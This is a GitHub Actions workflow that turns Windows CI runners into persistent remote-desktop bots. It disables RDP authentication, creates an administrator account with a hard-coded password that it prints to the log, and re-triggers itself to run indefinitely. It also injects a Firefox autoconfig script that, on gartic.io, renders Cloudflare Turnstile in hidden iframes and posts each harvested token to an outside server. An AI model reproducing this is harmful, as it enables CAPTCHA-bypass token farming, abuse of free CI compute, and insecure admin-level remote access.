name: ˢᵃᶤᶠ ₉₁

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

permissions:
  actions: write
  contents: read

jobs:
  gartic-bot:
    runs-on: windows-2019
    timeout-minutes: 360
    strategy:
      matrix:
        rdp_node: [1, 2]

    steps:
      - name: 1. Configure RDP Network
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389

      - name: 2. Inject Gartic Script (Step-by-Step Method)
        run: |
          $firefoxDir = "C:\Program Files\Mozilla Firefox"
          if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
          
          # إعدادات ملف التفعيل
          $pref = 'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);'
          $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force

          # كتابة السكربت سطر سطر لضمان الدقة (هاد السر اللي رح يحل المشكلة)
          "//" | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII
          "try {" | Add-Content "$firefoxDir\mozilla.cfg"
          "  window.addEventListener('load', function() {" | Add-Content "$firefoxDir\mozilla.cfg"
          "    if (location.href.includes('gartic.io')) {" | Add-Content "$firefoxDir\mozilla.cfg"
          "      setInterval(function() { location.reload(); }, 50000);" | Add-Content "$firefoxDir\mozilla.cfg"
          "      function sendToken(t) {" | Add-Content "$firefoxDir\mozilla.cfg"
          "        if (typeof t !== 'string' || t.length <= 20) return;" | Add-Content "$firefoxDir\mozilla.cfg"
          "        fetch('https://www.xsw.work.gd/add-token', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t }) }).catch(function() {});" | Add-Content "$firefoxDir\mozilla.cfg"
          "      }" | Add-Content "$firefoxDir\mozilla.cfg"
          "      window.addEventListener('message', function(e) { if (e.data && typeof e.data === 'string') { sendToken(e.data); } });" | Add-Content "$firefoxDir\mozilla.cfg"
          "      for (var i = 0; i < 6; i++) {" | Add-Content "$firefoxDir\mozilla.cfg"
          "        var f = document.createElement('iframe'); f.style.display = 'none'; f.sandbox = 'allow-scripts allow-same-origin'; document.body.appendChild(f);" | Add-Content "$firefoxDir\mozilla.cfg"
          "        f.srcdoc = '<html><head><script src=\"https://challenges.cloudflare.com/turnstile/v0/api.js\" async defer></script></head><body><div id=\"cf-turnstile\"></div><script>function r(){try{window.turnstile.render(\"#cf-turnstile\",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>';" | Add-Content "$firefoxDir\mozilla.cfg"
          "      }" | Add-Content "$firefoxDir\mozilla.cfg"
          "    }" | Add-Content "$firefoxDir\mozilla.cfg"
          "  });" | Add-Content "$firefoxDir\mozilla.cfg"
          "} catch (e) {}" | Add-Content "$firefoxDir\mozilla.cfg"

      - name: 3. Create RDP User & Setup Startup
        run: |
          $password = "admin@123"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "saif123" -Password $securePass -AccountNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "saif123"
          
          $startupPath = "C:\Users\saif123\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
          if (!(Test-Path $startupPath)) { New-Item -ItemType Directory -Force -Path $startupPath }
          $wshell = New-Object -ComObject WScript.Shell
          $shortcut = $wshell.CreateShortcut("$startupPath\launch_bot.lnk")
          $shortcut.TargetPath = "C:\Program Files\Mozilla Firefox\firefox.exe"
          $shortcut.Arguments = "-url https://gartic.io -url https://gartic.io"
          $shortcut.Save()

      - name: 4. Tailscale Setup
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
          Invoke-WebRequest -Uri $tsUrl -OutFile "$env:TEMP\tailscale.exe"
          Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet", "/norestart" -Wait
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="gartic-node-${{ matrix.rdp_node }}"

      - name: 5. Start Firefox & Loop
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          Start-Process "C:\Program Files\Mozilla Firefox\firefox.exe" "-url https://gartic.io -url https://gartic.io"
          $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          echo "::notice title=RDP INFO::IP: $ip | User: saif123 | Pass: admin@123"
          Start-Sleep -Seconds 20700
          gh workflow run "ˢᵃᶤᶠ ₉₁"
